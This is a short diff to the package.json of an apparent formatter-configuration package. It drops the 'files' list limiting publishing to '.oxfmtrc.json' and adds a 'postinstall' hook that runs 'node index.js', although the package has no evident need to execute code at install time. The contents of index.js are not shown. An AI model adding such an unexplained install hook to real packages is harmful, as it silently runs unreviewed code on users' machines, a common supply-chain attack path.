@@ -17,9 +17,10 @@
     },
     "license": "MIT",
     "author": "@NaverPayDev/frontend",
-    "files": [
-        ".oxfmtrc.json"
-    ],
+    "type": "commonjs",
+    "scripts": {
+        "postinstall": "node index.js"
+    },
     "devDependencies": {
         "oxfmt": "^0.16.0"
     },
